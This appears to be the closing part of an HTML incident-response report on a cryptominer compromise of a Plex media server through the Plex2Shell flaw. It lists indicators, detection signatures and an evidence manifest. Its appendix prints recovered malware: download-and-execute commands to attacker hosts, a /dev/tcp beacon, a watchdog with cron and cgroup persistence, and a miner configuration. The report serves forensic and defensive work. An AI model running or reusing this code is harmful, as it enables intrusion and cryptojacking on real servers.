+{/tmp,/var/tmp,/dev/shm}/.dl&lt;PID&gt;       loader download staging
+{/tmp,/var/tmp,/dev/shm}/.kpx{,.lck,.err}
+{/tmp,/var/tmp,/dev/shm}/.boat.lock
+{/tmp,/dev/shm}/.i  /tmp/i              dropper scripts
+/dev/shm/.x                             stage-2 download target
+/tmp/{.bashrc,.profile,.bash_profile}   boat-rc persistence
+/tmp/.config/systemd/user/cpuhp690.service
+/var/lib/plexmediaserver/.config/systemd/user/cpuhp690.service
+/var/lib/plexmediaserver/{CrashUploader,PlexScriptHost,PlexTunerService}
+/var/lib/plexmediaserver/.cache/.cpuhp690*
+…/Plug-ins/PlexScriptHost.bundle/Contents/Helpers/PlexScriptHost
+…/Codecs/*/zz*.so                       exploit payload (non-standard codec name)
+/tmp/.local/share                       HOME=/tmp artifact</pre>
+
+<h3>A.5 Behavioral signatures</h3>
+<ul>
+  <li>Any non-root process whose <code>comm</code> matches <code>kthreadd|ksoftirqd|kworker|cpuhp</code></li>
+  <li>Any process whose <code>/proc/PID/exe</code> resolves into <code>/tmp</code>, <code>/var/tmp</code> or <code>/dev/shm</code></li>
+  <li><code>.so</code> files in the Plex Codecs directory not matching <code>lib*_{decoder,encoder}.so</code></li>
+  <li>A <code>plex</code> crontab of any size (baseline: none)</li>
+  <li>Strings: <code>boatnet</code>, <code>boat-rc</code>, <code>boatnet-unit-v2</code>, <code>Plex exclusive occupant</code>, <code>app-plex</code>, <code>A-plex</code>, <code>BOAT_LOCK_FD</code></li>
+  <li>ELF executables with no section-header table and size ≈ 473.6–473.9 KB</li>
+</ul>
+
+<!-- ============ APPENDIX B ============ -->
+<h2 id="a2"><span class="n">B</span>Appendix B — Evidence manifest</h2>
+<p>Root: <code>/var/log/incident-2026-10-28-plex-miner/</code> — 426 files, 58 MB, mode 700 root:root. Collected 2026-10-28 11:33, before containment.</p>
+<table>
+<tr><th style="width:280px">Path</th><th>Contents</th></tr>
+<tr><td class="mono">FORENSIC-REPORT.md</td><td>Original response-session report (source document for this re-analysis)</td></tr>
+<tr><td class="mono">containment.log</td><td>Timestamped record of every containment action</td></tr>
+<tr><td class="mono">bin/ (111 files)</td><td>Recovered binaries, payloads, SHA256SUMS, dropper scripts, systemd units</td></tr>
+<tr><td class="mono">bin/recovered-pid&lt;N&gt;</td><td>13 process images recovered via /proc/PID/exe, incl. 3 unlinked binaries</td></tr>
+<tr><td class="mono">bin/tmp-cache/, plexlib-cache/</td><td>Full staging dirs incl. miner binary, config, runtime logs and state files</td></tr>
+<tr><td class="mono">bin/round2/, bin/round3/</td><td>Later-round artifacts — <strong>mixed provenance</strong> (contains benign media files)</td></tr>
+<tr><td class="mono">proc/ (283 files)</td><td>ps snapshots + per-PID cmdline/environ/status/maps/fd for 41 processes</td></tr>
+<tr><td class="mono">net/ (5 files)</td><td>ss -tanpo / -uanpo, iptables-save, ip addr, ip route</td></tr>
+<tr><td class="mono">cron/ (10 files)</td><td>All user crontabs, spool dir, /etc/cron.d, unit-file list</td></tr>
+<tr><td class="mono">logs/ (8 files)</td><td>Plex journal, auth/cron journal, auth.log, syslog (21 MB), dmesg, version info, payload stats</td></tr>
+<tr><td class="mono">round2-sweep.txt, pool-*.txt</td><td>Sweep outputs</td></tr>
+</table>
+
+<h3>B.1 Scope verified clean (per original sweeps)</h3>
+<ul>
+  <li>Root filesystem: full hash sweep, clean; <code>/storage</code> (multi-TB): clean, no executables written since Oct 25</li>
+  <li>Docker overlay roots and /var/lib/docker: clean; container crontabs empty</li>
+  <li>Plex Codecs directory: exactly 14 legitimate <code>lib*_{decoder,encoder}.so</code></li>
+  <li>No plex process outside a legitimate system.slice cgroup; no executable plex-owned content in tmpfs post-remediation</li>
+</ul>
+
+<!-- ============ APPENDIX C ============ -->
+<h2 id="a3"><span class="n">C</span>Appendix C — Malware code &amp; configuration artifacts</h2>
+
+<h3>C.1 Stage-1 decoded payload (condensed from the 1,976-byte base64 blob)</h3>
+<pre><span class="c"># executed via .init_array on every Plex startup</span>
+killall -9 xmrig xmr-stak minerd cpuminer kinsing kdevtmpfsi sysupdate \
+           mylovelyminer myawesomeproxy x12345 pwnrig 2&gt;/dev/null || true
+wget -q -T 8 -O /dev/shm/.x http://176.123.7.7/bins/1 \
+  || wget -q -T 8 -O /dev/shm/.x http://176.123.7.7/bins/4 \
+  || curl -fsS --max-time 8 -o /dev/shm/.x http://176.123.7.7/bins/1
+chmod 755 /dev/shm/.x
+setsid /dev/shm/.x app-plex &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 || true
+wget -q -T 8 -O /tmp/i http://176.123.7.7/A-plex || curl -fsS --max-time 8 -o /tmp/i http://176.123.7.7/A-plex
+/bin/sh /tmp/i app-plex || true
+<span class="c"># landing beacon</span>
+wget -q -T 4 -O /dev/null http://176.123.7.7/_land/p \
+  || … || /bin/bash -c 'printf GET\x20/_land/p\x20HTTP/1.0\r\n\r\n &gt;/dev/tcp/176.123.7.7/80'
+<span class="c"># secondary host, 5-way tool fallback, ports 80 then 18081</span>
+( wget -q -T 4 -O /tmp/i http://80.87.206.86/A || busybox wget … || curl … || python3 -c … || python -c … ) \
+|| ( … http://80.87.206.86:18081/A … )
+[ -s /tmp/i ] || exit 0
+for d in /data/git /data/gitea/home /home/git /dev/shm /tmp; do
+  mkdir -p $d 2&gt;/dev/null; cp -f /tmp/i $d/.i 2&gt;/dev/null || continue
+  chmod 755 $d/.i 2&gt;/dev/null; [ -x $d/.i ] || continue
+  setsid $d/.i app-plex &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; break
+done</pre>
+
+<h3>C.2 CrashUploader — "Plex exclusive occupant" watchdog (key functions)</h3>
+<pre><span class="c">#!/bin/sh — flock-guarded, 0.2 s main loop</span>
+escape()   { <span class="c"># detach from service cgroups</span> echo $$ &gt; /sys/fs/cgroup/cgroup.procs; … }
+ours()     { case "$1" in *CrashUploader*|*PlexScriptHost*|*PlexTunerService*) return 0 ;;
+             *176.123.7.7/_dbg*|*post-data=step*|*A-plex*) return 0 ;;
+             *"Plex Media Server"*|*"Plex Transcoder"*|*ffmpeg*|*EasyAudioEncoder*) return 0 ;; esac; return 1 }
+rival()    { case "$1" in *18899*|*plex_deploy*|*pd.sh*|*pd2.sh*|*pd3.sh*) return 0 ;;
+             *130.94.112*|*89.125.187*|*PLEX_FORCE_RESTART*|*PLEX_PROXY_ONLY*) return 0 ;;
+             *systemctl*restart*plex*|*killall*Plex*|*pkill*Plex*) return 0 ;; esac; return 1 }
+trap_drop(){ for f in /tmp/pd.sh /tmp/pd3.sh … /var/tmp/plex_deploy.sh; do
+             if [ "$(id -u)" = 0 ]; then : > "$f"; chmod 000 "$f"; chattr +i "$f"
+             else ln -sfn /dev/null "$f"; fi; done }
+scrub_cron(){ (crontab -l | grep -vE '18899|plex_deploy|pd\.sh|130\.94|89\.125|\.kpx|kpxb' \
+             | grep -vF CrashUploader | grep -vF PlexScriptHost
+             echo "* * * * * $0 $PX $T …"; echo "@reboot sleep 8; $0 $PX $T …") | crontab - }
+fw()       { [ "$(id -u)" = 0 ] || return 0; iptables -I OUTPUT -p tcp --dport 18899 -j REJECT;
+             iptables -I OUTPUT -d 130.94.112.0/24 -j REJECT; iptables -I OUTPUT -d 89.125.187.222 -j REJECT }
+<span class="c"># main: escape; fw; trap_drop; scrub_cron; loop { kr (kill rivals); ensure (respawn bot);
+#       every 40th iteration scrub_cron; every 80th fw; sleep 0.2 }</span></pre>
+
+<h3>C.3 Heartbeat loop <code>.cpuhp690.loop</code> (complete)</h3>
+<pre>#!/bin/sh
+while true; do
+if [ -x '/tmp/.cache/.cpuhp690' ]; then
+now=$(date +%s 2&gt;/dev/null) || now=
+ts=$(cat '/tmp/.cache/.cpuhp690.beat' 2&gt;/dev/null) || ts=
+if [ -n "$now" ] &amp;&amp; [ -n "$ts" ] &amp;&amp; [ "$((now - ts))" -gt 180 ]; then
+pid=$(head -n 1 '/dev/shm/.boat.lock' 2&gt;/dev/null); [ -n "$pid" ] &amp;&amp; kill -9 "$pid" 2&gt;/dev/null
+sleep 1; '/tmp/.cache/.cpuhp690' &gt;/dev/null 2&gt;&amp;1 &amp;
+fi; fi; sleep 45
+done</pre>
+
+<h3>C.4 Miner config <code>ksoftirqd.json</code> (condensed)</h3>
+<pre>{ "autosave":false, "background":false, "print-time":15,
+  "log-file":"/tmp/.cache/ksoftirqd.mlog", "retries":30, "retry-pause":10,
+  "cpu":{"enabled":true,"huge-pages":false,"max-threads-hint":100},
+  "randomx":{"mode":"auto","1gb-pages":false,"wrmsr":false,"rdmsr":false},
+  "pools":[
+    {"url":"us.moneroocean.stream:443","user":"851PGy…Yq8b.c83c820d","pass":"x","tls":true,"keepalive":true,"sni":true},
+    {"url":"de.moneroocean.stream:443", … },
+    {"url":"gulf.moneroocean.stream:443", … },
+    {"url":"sg.moneroocean.stream:443", … } ] }</pre>
+
+<h3>C.5 Loader runtime state (<code>.mine</code> / <code>.mstat</code>, at capture)</h3>
+<pre>v=2 en=1 tz=99 th=0 lp=0 mf=0 fr=0 pa=1
+sz=9657791  hh=1a831ecbb318c97cccf4d7c0a09b61a56d774b50bfd9cb7cf87b83881c819792
+ur=http://176.123.7.7/ks/ksoftirqd.vlog
+hr=100,100,100,100,100,100,100,100 (×24 logical CPUs)
+av=1 aq=1 cn=0 er=13 wx=9
+em=hash th=8 li=0 pid=3344711 age=1622 dest=/tmp/.cache/ksoftirqd
+ts=1793205154 (11:32:34 CDT)   rc=0 fl=0   lg=fetch_all_fail dest=/tmp/.cache/ksoftirqd
+po=0 pb=15   <span class="c"># miner killed at 11:04:17 after age 45,681 s (12 h 41 m), restarted as pid 3344711</span></pre>
+
+<h3>C.6 Loader environment (pid 1327450, first generation)</h3>
+<pre>=/dev/shm/.x
+HOME=/tmp
+PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+PWD=/tmp/plex-transcoder/Transcode/Sessions/plex-transcode-&lt;session-id-redacted&gt;
+BOAT_LOCK_FD=200</pre>
+
+<h3>C.7 References</h3>
+<ul>
+  <li>Censys advisory (2026-10-20) — censys.com/advisory/cve-2026-96652-cve-2026-96654-cve-2026-96655-cve-2026-96656/</li>
+  <li>SentinelOne CVE details — CVE-2026-96656, CVE-2026-96654</li>
+  <li>Brandefense — Plex2Shell analysis</li>
+  <li>BetaNews — Plex confirms active exploitation</li>
+  <li>Field Effect — active exploitation of Plex2Shell</li>
+</ul>
+
+<div class="footer">
+  <p><strong>IR-2026-1028</strong> — Independent re-analysis of the Plex2Shell cryptominer compromise of <code>media-server</code> (192.168.x.x).
+  Evidence base: <code>/var/log/incident-2026-10-28-plex-miner/</code> (426 files, 58 MB, collected 2026-10-28 11:33 CDT, pre-termination).
+  All timestamps CDT (UTC−5). Binary findings re-verified against preserved samples with <code>file</code>/<code>readelf</code>/<code>strings</code>/<code>sha256sum</code>.
+  Items marked <span class="pill new">NEW</span> were discovered during this re-analysis and are absent from the original report.
+  Conclusions labeled [inferred] are reasoned rather than observed. Prepared 2026-10-28.<br><strong>Sanitization:</strong> victim hostname, LAN addressing, remote-client IP (→ 203.0.113.24, RFC 5737), transcode session ID, Codecs machine ID, storage sizes and container names have been removed or genericized; no other content was altered.</p>
+</div>
+</div>
+</body>
+</html>
+
